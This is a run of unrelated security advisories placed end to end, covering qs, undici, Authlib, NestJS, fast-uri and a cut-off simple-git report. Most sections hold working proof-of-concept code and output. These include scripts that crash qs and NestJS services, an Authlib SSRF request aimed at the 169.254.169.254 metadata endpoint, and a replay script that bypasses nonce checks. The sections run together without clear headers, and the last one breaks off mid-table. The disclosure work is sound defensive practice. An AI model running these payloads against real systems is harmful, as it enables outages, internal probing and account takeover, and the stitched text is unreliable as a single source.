## Summary

`qs.stringify(obj, { arrayFormat: 'comma' })` throws an uncaught `TypeError: Cannot convert object to primitive value` when an array in `obj` contains an element that carries an own, non-callable `toString` property (for example `{ a: [ { toString: 'x' } ] }`). A remote, unauthenticated attacker who can influence an object that the application later re-serializes with the comma array format triggers the throw. In a service that lacks a synchronous error boundary around the serialization call, the uncaught exception crashes the worker process, producing a denial of service.

## Root Cause

When `arrayFormat: 'comma'` is selected, the comma branch collapses the whole array into a single value via `Array.prototype.join`, or, under `encodeValuesOnly: true`, maps each element through the value encoder before joining. Both paths perform an implicit string coercion (`ToPrimitive` with hint `"string"`) on each element. For an object whose own `toString` is a non-callable value, coercion skips the shadowed non-callable `toString`, falls through to `Object.prototype.valueOf` (which returns the object rather than a primitive), and throws. The comma branch runs this coercion before the per-element null and skip handling in the main loop, so nothing downstream can neutralize the hostile element, and the throw is never caught inside the library.

```text
lib/stringify.js  (comma-array branch)
  line 152-154: obj = utils.maybeMap(obj, function (v) { return v == null ? v : encoder(v); });  // encodeValuesOnly path
  line 156:     objKeys = [{ value: obj.length > 0 ? obj.join(',') || null : void undefined }];   // default comma path
lib/utils.js
  line 292:     string = String(str);   // value encoder coercion reached via the encodeValuesOnly path
```

## Impact

Prerequisites: the application calls `qs.stringify` with `arrayFormat: 'comma'` (a documented, supported option) on an object whose shape can be influenced by attacker input. Attacker-controllable sources include `qs.parse(input, { allowPrototypes: true })`, which retains a `toString` segment (Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set it), `qs.parse(input, { plainObjects: true })`, whose null-prototype elements throw even without a `toString` key (eg, `a[][b]=c`), and `JSON.parse` of a request body, which needs no qs parse option at all. No authentication or user interaction is required. Demonstrated capability: a single request forces an uncaught synchronous `TypeError` in the serialization call. In a naive single-process Node service with no synchronous error boundary, this crashes the process and takes the service offline (availability impact). Under a framework such as Express that traps synchronous handler throws, the plausible outcome is a per-request 500 rather than a full outage; that lower-impact case is noted but not the worst credible supported deployment. There is no confidentiality or integrity impact, no memory unsafety, and no prototype pollution.

## Proof of Concept

`Install qs at the affected version (for example 6.16.0) and run the following script with Node.js. No network setup is required; it demonstrates the throw in isolation.`

```js
var qs = require('qs');

// Source A: qs.parse with allowPrototypes retains the hostile toString segment
qs.stringify(qs.parse('a[0][toString]=x', { allowPrototypes: true }), { arrayFormat: 'comma' });

// Source B: a JSON request body, no qs parse option needed
qs.stringify(JSON.parse('{"a":[{"toString":"x"}]}'), { arrayFormat: 'comma' });

// Also affected: the encodeValuesOnly sub-path
qs.stringify(JSON.parse('{"a":[{"toString":"x"}]}'), { arrayFormat: 'comma', encodeValuesOnly: true });
```

```text
A default-join (allowPrototypes) => THREW: TypeError: Cannot convert object to primitive value
B default-join (JSON.parse) => THREW: TypeError: Cannot convert object to primitive value
C encodeValuesOnly path => THREW: TypeError: Cannot convert object to primitive value
N2 callable toString => NO THROW; output="a=z"
N3 isBuffer vector (CVE-2026-82417) => NO THROW; output="a%5Bconstructor%5D%5BisBuffer%5D=x"
qs version: 6.16.0
```

## Attack Chain

1. **Exposure:** A remote, unauthenticated request reaches an endpoint whose handler eventually serializes attacker-influenced data with `qs.stringify(obj, { arrayFormat: 'comma' })`.
2. **Control:** The attacker supplies data that becomes `{ a: [ { toString: <non-callable value> } ] }`, either via `a[0][toString]=x` parsed with `allowPrototypes`, or via a JSON body `{"a":[{"toString":"x"}]}`.
3. **Path:** In `stringify`, the primitive/buffer guard at `lib/stringify.js:134` is false for an array, so control reaches the comma branch at `lib/stringify.js:149`.
4. **Guard:** On the `encodeValuesOnly` path, the closure `v == null ? v : encoder(v)` at `lib/stringify.js:152-154` passes only `null`/`undefined` through; a non-null object still reaches the encoder. The default path skips that closure entirely and reaches `obj.join(',')` at `lib/stringify.js:156` with no guard at all.
5. **Primitive:** The element is coerced to a string (`Array.prototype.join`, or `String(str)` at `lib/utils.js:292`). `ToPrimitive` skips the non-callable own `toString`, `valueOf` returns the object, and a `TypeError` is thrown.
6. **Result:** The uncaught synchronous exception propagates out of the serialization call, failing the request and, in a service without a synchronous error boundary, crashing the process (denial of service).

## Bypass Evidence

This is a different element type on the code path CVE-2026-8723 (GHSA-q8mj-m7cp-5q26) patched, plus the default comma path, which that fix never covered. CVE-2026-8723 addressed a `TypeError` crash on `null`/`undefined` entries in the comma plus `encodeValuesOnly` path. Its fix (commit 21f80b3) wraps the encoder in `function (v) { return v == null ? v : encoder(v); }`, so it only passes `null` and `undefined` through. A non-null element with a hostile own `toString` fails the `v == null` test, so the encoder still runs and still throws; the encodeValuesOnly case (case C above) throws on the exact fixed code. The default comma path (`encodeValuesOnly` unset, the library default) never entered that fix at all: `git log -S "obj.join(','" -- lib/stringify.js` shows no security fix has ever touched the `obj.join(',')` line, and cases A and B throw with `encodeValuesOnly` unset. The related isBuffer hardening for CVE-2026-82417 (commit e83d321) is a different sink at the `lib/stringify.js:134` guard, which is never entered for the array element; the negative control `{a:{constructor:{isBuffer:'x'}}}` serializes cleanly. Disproof attempts that failed: a `valueOf`-only object does not throw (it serializes to `[object Object]`), confirming the trigger is an element with no callable `toString` (an own non-callable `toString`, or a null-prototype object with no `toString` at all, as `qs.parse` produces under `plainObjects`); nested arrays (`{"a":[[{"toString":"x"}]]}`) throw the same way; a callable `toString` serializes cleanly; and the default (non-comma) array format serializes cleanly, confirming the comma format is required. All positive and negative cases were reproduced on the exact published 6.16.0 artifact.

## Affected Versions

- `Ecosystem: npm`
- `Package: qs`
- `Confirmed affected range: >= 6.7.0, <= 6.16.0`
- `Latest release checked: 6.16.0 (npm latest; git tag v6.16.0)`
- `Fix status: fixed in 6.16.1 (a952e75)`

The `arrayFormat: 'comma'` join sink was introduced in qs 6.7.0, so 6.7.0 is the lower boundary; releases before 6.7.0 lack the sink. No released version fixes this vector, and the latest published release (6.16.0) reproduces the throw, so the closed upper bound `<= 6.16.0` covers every affected release. The `encodeValuesOnly` sub-path was added later, but the default comma-join vector already affects 6.7.0, so 6.7.0 governs the lower boundary.

## Suggested Fix

The comma array serialization must not allow an implicit string coercion of an array element to throw an uncaught exception. Coercion of each comma element should be performed defensively (for example by wrapping the join and per-element encode so that a coercion failure is caught and handled), and this protection must cover both the default `obj.join(',')` path and the `encodeValuesOnly` encoder path, not only the previously patched `null`/`undefined` case. As an interim mitigation without a code change, applications can avoid `arrayFormat: 'comma'` when serializing data derived from untrusted input, sanitize parsed objects (avoid `allowPrototypes`/`plainObjects` on untrusted input and strip unexpected own properties), or wrap `qs.stringify` calls in a synchronous error boundary so a coercion failure cannot crash the process.

## Independent report by @Lucidsec

The following was reported separately, after this advisory, and is merged here as a duplicate.

### Summary

In project [qs](https://github.com/ljharb/qs), in versions `>= 6.7.0, <= 6.16.0` (every version that supports `arrayFormat: 'comma'`), `qs.stringify` with `arrayFormat: 'comma'` can throw an uncaught `TypeError: Cannot convert object to primitive value` when an array element has a non-callable own `toString`. It is fixed in 6.16.1. Related: CWE-248 and CWE-704.

### Technical Details

`qs.stringify` with `arrayFormat: 'comma'` joins an array at `lib/stringify.js:156` via `obj.join(',')`. An element whose own `toString` is not callable makes `Array.prototype.join` throw. There is no type check and no catch on that path.

A second path exists with `encodeValuesOnly`: at `lib/stringify.js:151-154`, `maybeMap` only skips `v == null`, then `lib/utils.js:292` does `String(str)` and throws the same `TypeError` (this second site exists since v6.11.1; before that, the same input throws at `join`).

Who can trigger: someone who can shape an array element passed to `stringify`. The host must use non-default `arrayFormat: 'comma'`. Default `arrayFormat` `indices` does not fold arrays and is not affected. A parse-then-stringify path also needs `plainObjects: true` (null-prototype elements from `lib/parse.js:200`) or `allowPrototypes: true` (which Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set). Default `qs.parse('a[0][toString]=x')` returns `{}` because the prototype guard drops `toString`. Direct JSON handed to `stringify` can supply `{"a":[{"toString":"x"}]}`.

Cause: the comma fold at `lib/stringify.js:149-156` collapses the array into a single value before the main loop at `lib/stringify.js:172-212`, so `skipNulls` and `strictNullHandling` only ever see the joined value, never individual elements. `isNonNullishPrimitive` / `isBuffer` at `lib/stringify.js:134` inspect the whole value, not each element. A normal object uses `Object.prototype.toString` and becomes `[object Object]`. An own non-callable `toString` is skipped, `valueOf` returns the object, and `join` throws. (The skipped TODO test at `test/stringify.js:684-689` uses a plain `{ b: 1 }` element, which does not throw; it covers the separate question of what comma format should output for object elements, not this crash.) Earlier comma crash fixes did not cover object elements.

### Impact

One small input makes that serialization path throw a synchronous, catchable `TypeError`. Behind a framework error boundary (eg, a synchronous Express handler), the request fails with a 500 and the process survives. In a host with no error boundary (eg, a bare `http.createServer` handler), the uncaught exception exits the process (the client sees `ECONNRESET`). Availability only.

### Proof of Concept

<details>
<summary>Show the proof of concept</summary>

Checked on the latest commit that was checked: `07b1d4d82c8f9301c105ea4b94fa2302cfd6e8b4`. Still present. Demonstrated.

- Payload `{"a":[{"toString":"x"}]}` throws at `lib/stringify.js:156`.
- Baseline `{"a":["x","y"]}` returns 200 with body `a=x%2Cy`.
- A plain object element stringifies to `a=%5Bobject%20Object%5D` and does not throw.
- `encodeValuesOnly: true` throws via `utils.js:292`.
- `plainObjects` parse plus comma throws.

</details>

### Suggested Fix

Before `join`, map elements with the existing primitive check; skip or replace non-primitives so `join` cannot throw. On the `encodeValuesOnly` path, do not send non-primitives into `String()`. Optionally guard `lib/utils.js:292`. Add new regression tests.

### Impact

undici's experimental WebSocket client (enabled by default via `allowH2: true`) crashes the Node.js process when it connects to a malicious server over HTTP/2. If the server answers the WebSocket upgrade with a response that fails handshake validation, undici aborts the request, but the abort is a no-op because the request is already marked completed, so the underlying `ClientHttp2Stream` is left open with no error listener. When the server then destroys the connection, the orphaned stream emits an unhandled `error` and the process exits. A remote, unauthenticated server can therefore deny service to any client that opens a WebSocket to it over HTTP/2. undici 8.11.0 and 8.11.1 are affected; the regression was introduced in 8.11.0.

### Patches

Upgrade to `8.11.2`.

### Workarounds

Set `allowH2: false` to disable HTTP/2 for WebSocket connections, or avoid opening WebSocket connections to untrusted servers, until upgrading.

Summary

Authlib's symmetric (oct) key handling accepts an empty key (empty bytes b'' / empty string '') as a valid HMAC signing and verification key. An empty HMAC key produces a deterministic digest that any party can reproduce, so an attacker who knows (or can cause) the application to verify a token with an empty key can forge arbitrary tokens that pass HS256/HS384/HS512 signature verification. This is the Authlib member of the cross-language empty-HMAC-key family already assigned CVE-2026-44351 (fast-jwt, npm) and CVE-2026-45363 (ruby-jwt, RubyGems).

This is DISTINCT from Authlib's existing recent JWT-verification advisories. It is not closed by CVE-2026-27962 / GHSA-wvwj-cvrp-7pv5 (JWS JWK header injection, the key=None case), nor by CVE-2026-28802 / GHSA-7wc2-qxgw-g8gg (alg:none blank-signature bypass), nor by GHSA-5357-c2jx-v7qh (algorithm confusion with asymmetric public keys). Those address header-driven key injection, the none algorithm, and asymmetric-vs-symmetric confusion respectively; none of them rejects a zero-length oct key.

Affected versions

Authlib <= 1.7.2 (latest release 1.7.2, 2026-05-06). Confirmed present at the v1.7.2 release tag and on the current main HEAD. The affected code is in authlib/jose/rfc7518/oct_key.py and authlib/jose/rfc7518/jws_algs.py.

Root cause (exact code location, release tag v1.7.2)

- authlib/jose/rfc7518/oct_key.py, class OctKey:
  - validate_raw_key is a type-only check: `return isinstance(key, bytes)`. An empty bytes object passes.
  - import_key rejects only keys whose material starts with known unsafe prefixes (`if raw_key.startswith(POSSIBLE_UNSAFE_KEYS): raise ValueError(...)`, i.e. PEM/SSH prefixes). Empty bytes do not match any unsafe prefix, so b'' is accepted.
  - get_op_key loads the raw key without validating its length.
  - No check anywhere rejects a zero-length key, so an empty key b'' passes every gate.
- authlib/jose/rfc7518/jws_algs.py, class HMACAlgorithm:
  - prepare_key: `return OctKey.import_key(raw_data)`.
  - sign / verify call key.get_op_key(...) then `hmac.new(op_key, msg, self.hash_alg)` / `hmac.compare_digest(...)`. With an empty op key this becomes hmac.new(b'', ...): a deterministic, publicly reproducible digest. There is no empty-key or minimum-length check.

Why this is a real signature bypass

An empty HMAC key makes the signature a public, deterministic function of the header and payload, so anyone can compute a valid signature and forge tokens. The realistic trigger matches the sibling CVEs: the deploying application sources the verification key from a place that can be empty at runtime, for example os.environ.get('JWT_SECRET', ''), a database/config column whose default is '', or a key-resolver that returns '' on a miss. Authlib is widely used to BUILD token verifiers (OAuth 2.0 resource servers, OIDC relying parties), and Authlib's own recent advisory history shows the JWS/JWT verify path is the live attack surface, so a key-resolution path that can yield '' is a realistic exposure.

Reproduction (prose, no weaponized exploit)

1. In an application that uses Authlib to verify JWS/JWT, arrange for the verification key to be an empty value (e.g. an unset environment variable defaulted to '').
2. An attacker constructs a token with header {alg: HS256} and an arbitrary payload, and computes the HS256 signature using an empty key (a value any party can reproduce because the key is empty).
3. Authlib's HMAC verification accepts the token as validly signed, because OctKey.import_key did not reject the empty key and hmac.compare_digest matches the attacker-computable digest. The forged token is treated as authentic.

No live system was probed; the above describes the class. The vulnerable code path and the absent guard are confirmed by direct reading of the public source at the v1.7.2 tag and on current main.

Proof the fix is known-good (no novelty risk)

The same maintainer's newer JOSE library, joserfc, ALREADY rejects empty oct key material outright. In src/joserfc/_rfc7518/oct_key.py, import_key raises a ValueError on empty oct material, with an explicit note that an empty oct key produces a deterministic HMAC digest that any party can reproduce, allowing trivial signature forgery in JWS HS256/HS384/HS512 verification. (joserfc additionally warns on keys below 112 bits.) The same guard is simply absent from the older, far more widely deployed Authlib rfc7518 package. The flagship Python JOSE libraries also guard: PyJWT raises InvalidKeyError('HMAC key must not be empty.') for zero-length keys, and jwcrypto enforces an RFC 7518 minimum key length.

Impact

Token forgery / authentication bypass in OAuth 2.0 resource servers and OIDC relying parties built on Authlib whenever the HMAC verification key can be empty at runtime. An attacker can mint tokens with arbitrary claims (for example elevated scopes or another user's subject) that pass signature verification.

Suggested remediation

Reject empty oct key material in OctKey.import_key (and/or validate_raw_key), exactly as the maintainer's joserfc library already does, before the key can reach hmac.new in HMACAlgorithm.sign / verify. Consider also adopting joserfc's sub-112-bit minimum-length warning/rejection for HMAC keys.

### Summary

Authlib's RFC 9101 (JAR) extension passes the attacker-controlled `request_uri` authorization parameter straight to the `get_request_object()` fetch hook with no validation, at a pre-authentication endpoint. Authlib already defines the pre-registration allowlist for this (`request_uris` client metadata and `require_request_uri_registration` server metadata) but the extension never consults it, and both docstrings instruct integrators to implement the hook as an unrestricted `requests.get(request_uri)`. Deployments following the documented pattern get an unauthenticated SSRF primitive. 
### Details

Verified against authlib 1.7.2 and current `main`. All line numbers below are from `authlib/oauth2/rfc9101/authorization_server.py`.

The extension registers itself on the `before_get_authorization_grant` hook (lines 62-65), so it runs on every authorization request before any user or client authentication. `support_request_uri` defaults to `True` (line 58).

The only gate before the sink is that `client_id` names an existing client (lines 91-103). A `client_id` is a public, non-secret identifier.

The sink at line 159 forwards the raw parameter with no scheme, host, or allowlist check:

```python
def _get_raw_request_object(self, request: OAuth2Request) -> str:
    if "request_uri" in request.payload.data:
        raw_request_object = self.get_request_object(
            request.payload.data["request_uri"]
        )
        if not raw_request_object:
            raise InvalidRequestUriError(state=request.payload.state)
```

`get_request_object` is abstract (line 213, `raise NotImplementedError()` at line 225), so authlib itself performs no outbound request. The defect is that authlib supplies unvalidated attacker input to that extension point and then documents the insecure implementation twice — in the class docstring (lines 34-38) and in the hook's own docstring (lines 218-223):

```python
def get_request_object(self, request_uri: str):
    try:
        return requests.get(request_uri).text
    except requests.Exception:
        return None
```

Two points sharpen this beyond a generic documentation issue:

- **The allowlist already exists and is ignored.** Authlib validates `request_uris` as client metadata (`authlib/oauth2/rfc7591/claims.py:319`) and `require_request_uri_registration` as server metadata (`authlib/oauth2/rfc8414/models.py:263`). The `rfc9101` package contains zero references to either name, so the pre-registration model is never enforced at the point of use.
- **RFC 9101 §10.4.1 asks for controls that are absent.** It states the server should "a) check that the value of the `request_uri` parameter does not point to an unexpected location, b) check that the media type of the response is `application/oauth-authz-req+jwt`, c) implement a timeout for obtaining the content of `request_uri`, and d) not perform recursive GET on the `request_uri`." The extension implements none of these and the documented example implements none of them either.

The two failure paths are distinguishable, which supplies the inference channel for a blind SSRF: a falsy fetch result raises `InvalidRequestUriError` (`invalid_request_uri`, lines 162-163), while a successful fetch of non-JWT content raises `InvalidRequestObjectError` (`invalid_request_object`, line 186).

### PoC

This demonstrates the library-level defect with no network egress required: it shows the unvalidated URI reaching the fetch hook pre-authentication.

```bash
python -m venv .venv && .venv/bin/pip install authlib
```

```python
from authlib.oauth2.rfc6749.requests import BasicOAuth2Payload, OAuth2Request
from authlib.oauth2.rfc9101 import JWTAuthenticationRequest

reached = []

class Extension(JWTAuthenticationRequest):
    def get_request_object(self, request_uri):
        reached.append(request_uri)  # the docstring puts requests.get(request_uri) here
        return None

    def resolve_client_public_key(self, client):
        return {"keys": []}

    def get_server_metadata(self):
        return {}

    def get_client_require_signed_request_object(self, client):
        return False

class AuthorizationServer:
    def query_client(self, client_id):
        return object()

uri = "http://169.254.169.254/latest/meta-data/"
request = OAuth2Request("GET", "https://as.example/authorize")
request.payload = BasicOAuth2Payload({"client_id": "demo", "request_uri": uri})

try:
    Extension().parse_authorization_request(AuthorizationServer(), request)
except Exception as exc:
    print("error:", type(exc).__name__)

print("fetch hook received:", reached)
```

Output on authlib 1.7.2:

```text
error: InvalidRequestUriError
fetch hook received: ['http://169.254.169.254/latest/meta-data/']
```

Against a deployment that used the docstring implementation, the equivalent unauthenticated request is:

```text
GET /authorize?response_type=code&client_id=demo&request_uri=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F
```

Returning a fetched-but-non-JWT body instead of `None` in the snippet above yields `InvalidRequestObjectError` rather than `InvalidRequestUriError`, showing the oracle that distinguishes a reachable target from an unreachable one.

### Impact

Server-side request forgery, reachable without authentication by anyone who knows a valid `client_id`. In a deployment that implemented `get_request_object` as documented, an attacker can make the authorization server issue GET requests to arbitrary URLs: internal-only services, cloud metadata endpoints such as `169.254.169.254`, and side-effectful internal GET routes. The `invalid_request_uri` versus `invalid_request_object` split, together with response timing, provides an oracle for internal host and port discovery. RFC 9101 §10.4.1 additionally notes the DoS and recursive-lookup risks that the missing timeout and recursion checks leave open.

Response bodies are consumed as a JWT and never reflected, so this is a blind primitive rather than direct data exfiltration. Because the fetch executes in integrator code, deployments that already allowlist inside their override are unaffected — but authlib provides no hook to make that the default, ships `support_request_uri=True`, and its documentation steers integrators to the unsafe implementation, so the insecure outcome is the expected one.

### Summary

`OpenIDMixin.parse_id_token()` reads the `nonce_supported` claim from the ID token it is validating. When that claim is boolean `false`, the expected nonce is set to `None` and nonce validation is skipped for that token.

An ID token that carries this claim is therefore accepted in a session whose nonce does not match. A captured, validly signed ID token belonging to a victim can be replayed into an attacker-controlled session, authenticating the attacker as the victim at the relying party.

The code is identical in `authlib/integrations/base_client/sync_openid.py:82-83` and `authlib/integrations/base_client/async_openid.py:84-85`, so all framework integrations are affected. Fixed versions: none; reproduced on 1.8.0 (commit c529a61a).
  
Preconditions: the ID token must carry a valid signature and pass `iss` and `aud` validation, and the attacker must be able to supply it to `parse_id_token()`. Authorization code flow is not affected. Implicit and hybrid relying parties, and applications calling `parse_id_token()` directly, are affected.

### Details

## Affected code

`authlib/integrations/base_client/sync_openid.py:80-85`, in `parse_id_token()`:

```python
claims = claims_cls(token.claims, token.header, claims_options, claims_params)
# https://github.com/authlib/authlib/issues/259
if claims.get("nonce_supported") is False:
    claims.params["nonce"] = None

claims.validate(leeway=leeway)
```

`authlib/integrations/base_client/async_openid.py:82-86` contains the same code.

## Source of the claim

`claims` is constructed from `token.claims`, which is the decoded payload of the ID token passed to `parse_id_token()`:

```python
token = jwt.decode(
    token["id_token"],
    key=key_set,
    registry=JWSRegistry(algorithms=alg_values, strict_check_header=False),
)
...
claims = claims_cls(token.claims, token.header, claims_options, claims_params)
```

`claims.get("nonce_supported")` therefore resolves against the ID token payload. It is not read from `load_server_metadata()`, from client configuration, or from any other source under the relying party's control.

## Effect on validation

`IDToken.validate_nonce()` at `authlib/oidc/core/claims.py:69-83` performs the comparison only when the expected value is truthy:

```python
nonce_value = self.params.get("nonce")
if nonce_value:
    if "nonce" not in self:
        raise MissingClaimError("nonce")
    if nonce_value != self["nonce"]:
        raise InvalidClaimError("nonce")
```

Assigning `claims.params["nonce"] = None` makes `nonce_value` falsy, so both the presence check and the equality check are skipped. No error is raised and `claims.validate()` completes normally.

The docstring of that same method states the requirement:

> If present in the ID Token, Clients MUST verify that the nonce Claim Value is equal to the value of the nonce parameter sent in the Authentication Request.

## Trigger condition

The comparison is `is False`, so only a JSON boolean `false` activates the branch. A string value `"false"` does not, and nonce validation proceeds normally in that case.

## Origin

The branch was added in commit `3ca7333c` ("Skip verifying nonce for Apple case") to accommodate a provider that emits a `nonce_supported` claim, as referenced by the inline comment pointing to issue #259.

## Remediation

Read the flag from server metadata or client configuration rather than from the token:

```python
metadata = self.load_server_metadata()
if metadata.get("nonce_supported") is False:
    claims.params["nonce"] = None
```

This preserves the behavior for relying parties configured against a provider that does not support nonces, while preventing the token from determining whether it is subject to nonce validation.

### Proof of concept

## Environment

- authlib 1.8.0, commit `c529a61a` (tag `v1.8.0`)
- Python 3.14
- joserfc 1.7.5
- No network access required

```
git clone https://github.com/authlib/authlib.git && cd authlib
git checkout c529a61a
python3 -m venv .venv
.venv/bin/pip install -e . joserfc==1.7.5
.venv/bin/python poc.py
```

## Configuration

The relying party is a subclass of the shipped `OpenIDMixin` supplying only `client_id` and `load_server_metadata()`. `fetch_jwk_set()` returns `metadata["jwks"]` directly when the key set is present in metadata, so no HTTP request is made and no part of the validation path is stubbed.

The signing key is a generated RSA key. All three tokens are signed with it, carry `iss` and `aud` matching the relying party configuration, and are within their validity window. The relying party's session nonce is `nonce-the-rp-actually-generated`; every token carries the different nonce `nonce-from-the-captured-token`.

## poc.py

```python
from joserfc import jwt
from joserfc.jwk import RSAKey
from authlib.integrations.base_client.sync_openid import OpenIDMixin

ISSUER = "https://as.example"
CLIENT_ID = "rp-client"
KEY = RSAKey.generate_key(2048, parameters={"kid": "k1"})
JWKS = {"keys": [KEY.as_dict(private=False)]}

class RP(OpenIDMixin):
    client_id = CLIENT_ID

    def load_server_metadata(self):
        return {"issuer": ISSUER, "jwks": JWKS}

def id_token(nonce, sub="victim", nonce_supported=None):
    claims = {"iss": ISSUER, "sub": sub, "aud": CLIENT_ID,
              "iat": 1000000000, "exp": 4000000000, "auth_time": 1000000000}
    if nonce is not None:
        claims["nonce"] = nonce
    if nonce_supported is not None:
        claims["nonce_supported"] = nonce_supported
    return jwt.encode({"alg": "RS256", "kid": "k1"}, claims, KEY)

rp = RP()
SESSION_NONCE = "nonce-the-rp-actually-generated"
CAPTURED_NONCE = "nonce-from-the-captured-token"

cases = [
    ("[1] no nonce_supported claim", None),
    ("[2] nonce_supported: false", False),
    ("[3] nonce_supported: \"false\"", "false"),
]

for label, flag in cases:
    tok = {"access_token": "AT",
           "id_token": id_token(CAPTURED_NONCE, nonce_supported=flag)}
    try:
        user = rp.parse_id_token(tok, nonce=SESSION_NONCE)
        print(f"{label:34s} -> ACCEPTED sub={user['sub']}")
    except Exception as e:
        print(f"{label:34s} -> REJECTED {type(e).__name__}: {e}")
```

## Expected result

All three cases carry a nonce that does not match the relying party's session nonce, so all three should be rejected.

## Observed result

```
[1] no nonce_supported claim       -> REJECTED InvalidClaimError: invalid_claim: Invalid claim: 'nonce'
[2] nonce_supported: false         -> ACCEPTED sub=victim
[3] nonce_supported: "false"       -> REJECTED InvalidClaimError: invalid_claim: Invalid claim: 'nonce'
```

Case [1] shows nonce validation rejecting a mismatched nonce under normal conditions. Case [2] differs from case [1] only by the addition of the `nonce_supported` claim and is accepted, returning the subject of the replayed token. Case [3] confirms the branch requires a JSON boolean.

The script exits 0 and produces identical output across three runs.

### Impact

## Type of vulnerability

Reliance on an untrusted input in a security decision (CWE-807), resulting in authentication bypass by capture-replay (CWE-294).

The nonce binds an ID token to the browser session that requested it and is the control that prevents a token issued for one session being presented in another. Because the flag that governs this check is read from the token itself, the check can be disabled by the data it is applied to.

## Who is impacted

OpenID Connect relying parties built on authlib's client integrations where an attacker can supply an ID token to `parse_id_token()`:

- Implicit flow relying parties, where the ID token is returned in the URL fragment.
- Hybrid flow relying parties, where the ID token is returned in the fragment or by form post.
- Applications calling `parse_id_token()` directly on externally supplied input.

Both the synchronous and asynchronous integrations are affected, so Flask, Django and Starlette deployments are equally exposed.

Relying parties using plain authorization code flow are not impacted, as the ID token is retrieved from the token endpoint over TLS following a `state` lookup and cannot be substituted by an attacker.

## Consequence

An attacker in possession of a victim's ID token replays it into their own session. Nonce validation is skipped, `parse_id_token()` returns a `UserInfo` for the victim's subject, and the relying party establishes an authenticated session as the victim. This grants access to the victim's account at that relying party, including any data and actions available through it.

The token must carry a valid signature and pass `iss` and `aud` validation, so the vulnerability does not permit forging tokens or authenticating as an arbitrary subject. It removes the replay protection from a genuine token that has been captured, for example from browser history, a `Referer` header, proxy or server logs, or a shared device.

## Mitigation available to integrators

None. The check is performed inside `parse_id_token()`, and no parameter or configuration option is exposed to disable the behaviour or to override the nonce handling.

### Summary

A single message whose `pattern` is a deeply nested object terminates a NestJS microservice that uses the TCP or
RabbitMQ transport. The server serialized the client-supplied pattern with `JSON.stringify` to derive the handler
lookup key; on deeply nested input this throws `RangeError: Maximum call stack size exceeded`. The exception escaped
the asynchronous message handler as an unhandled promise rejection, which terminates the Node.js process under the
default `--unhandled-rejections=throw`.

### Impact

Denial of service, one message per crash, repeatable. The attacker needs to be able to reach the transport: connect
to the TCP transport's port, or publish to the queue or exchange the service consumes from. The TCP transport
performs no authentication by default, so on a reachable port this requires nothing else.

Only the **TCP** and **RabbitMQ** transports are affected. The other transports take the pattern as a string from the
broker topic or channel and never serialize a client-supplied object to build it.

### Details

In `ServerTCP#handleMessage` and `ServerRMQ#handleMessage` the pattern was stringified without a guard:

```ts
const pattern = isString(packet.pattern)
  ? packet.pattern
  : JSON.stringify(packet.pattern);
```

`JSON.parse` accepts nesting depths that `JSON.stringify` cannot re-serialize, because `JSON.stringify` recurses
natively, so an attacker can craft a payload that parses successfully on arrival and then throws when the pattern is
converted back to a string. Neither transport attached a rejection handler to the promise returned by
`handleMessage`, so the `RangeError` propagated out as an unhandled rejection.

### Proof of concept

Against a NestJS microservice on the TCP transport (default port 3001). The nested JSON is built as text rather than
with `JSON.stringify`, which is what makes the payload serializable by the attacker but not by the victim:

```js
const { connect } = require('node:net');

const DEPTH = 100_000;
const pattern = '{"nested":'.repeat(DEPTH) + '{}' + '}'.repeat(DEPTH);
const payload = `{"pattern":${pattern},"data":null,"id":"1"}`;

const socket = connect(3001, '127.0.0.1', () => {
  // Nest's TCP framing is <byteLength>#<json>
  socket.write(`${Buffer.byteLength(payload)}#${payload}`);
});
```

The service exits with `RangeError: Maximum call stack size exceeded`. The equivalent payload published to the
consumed queue crashes a RabbitMQ-transport service.

### Patches

Fixed in **12.0.2** and **11.2.4**.

- Incoming patterns are converted through a guarded `Server#getPatternAsString`, which falls back to a sentinel value
  that matches no handler. Such a message now receives the ordinary "no message handler" response (TCP) or is
  negatively acknowledged (RabbitMQ) instead of crashing the process.
- Rejections escaping `handleMessage` in both transports are routed to `handleError` rather than left unhandled.

### Workarounds

If you cannot upgrade, restrict network access to the transport so that only trusted peers can reach it. Running the
process with `--unhandled-rejections=warn` prevents the crash but leaves the message unprocessed and is not a
substitute for the fix.

### Credit

Reported by ZeroVuln Labs.

### Impact

`fast-uri` folds the host to lowercase before it percent-decodes the host, so a percent-encoded uppercase unreserved octet such as `%41` decodes to a literal `A` that is never folded. For a scheme-relative reference (`//host`) there is no scheme, so the host canonicalization that repairs this on a scheme-bearing URL does not run. As a result `parse`, `normalize`, and `equal` disagree on the same host: `parse("//%41.com").host` returns `"A.com"` while `parse("//a.com").host` and `parse("//A.com").host` return `"a.com"`, and `equal("//%41.com", "//a.com")` is `false` even though `equal("//A.com", "//a.com")` is `true`. An application that makes a case-sensitive host decision on `fast-uri` output for a scheme-relative reference, for example a host allowlist or denylist that compares `parse(url).host` or uses `fast-uri.equal`, can be steered past the check with a percent-encoded uppercase octet. Because a hostname is case-insensitive in DNS and HTTP routing, the evading spelling reaches the same host the check meant to gate, so the effect is check evasion rather than reaching a different registrable host.

### Patches

Upgrade to `fast-uri` 4.1.5, 3.1.8, or 2.4.7.

### Workarounds

Compare hosts case-insensitively (lowercase the parsed host before any allowlist or denylist decision), or avoid making case-sensitive host decisions on scheme-relative input until upgrading.

### Impact

`fast-uri`'s `mailto` scheme parser compares each query field name to the reserved names (`to`, `subject`, `body`) while the name is still percent-encoded, and only percent-decodes it when storing it as a generic header. On serialize, the decoded name is re-emitted, so a field name such as `%74o` (percent-encoded `to`) is not recognized as a recipient at parse time (`parse().to` shows only the legitimate recipient) but materializes as a literal `to=` field after `serialize()`, and reparsing then treats it as a recipient. The same technique smuggles `subject` and `body` through `%73ubject` and `%62ody`.

An application that parses an untrusted mailto URI, makes a display, allowlist, or logging decision on `parse().to`, then re-serializes the result and passes the serialized string to a mail client or an outbound send path can gain an attacker-chosen recipient, subject, or body that was not visible when the recipient list was checked. A scanner inspecting the raw input for an extra `to=` sees nothing, because the injected field appears only after `fast-uri` serializes.

### Patches

Upgrade to `fast-uri` 4.1.5.

### Workarounds

Percent-decode and compare mailto field names case-insensitively before trusting `parse().to`, or re-check the recipient list on the serialized output rather than only on the initial parse, until upgrading.

# Security control bypass in `@simple-git/argv-parser`: Git's `VISUAL` editor fallback is not classified as `allowUnsafeEditor`

## Report metadata

| Field | Value |
| --- | --- |
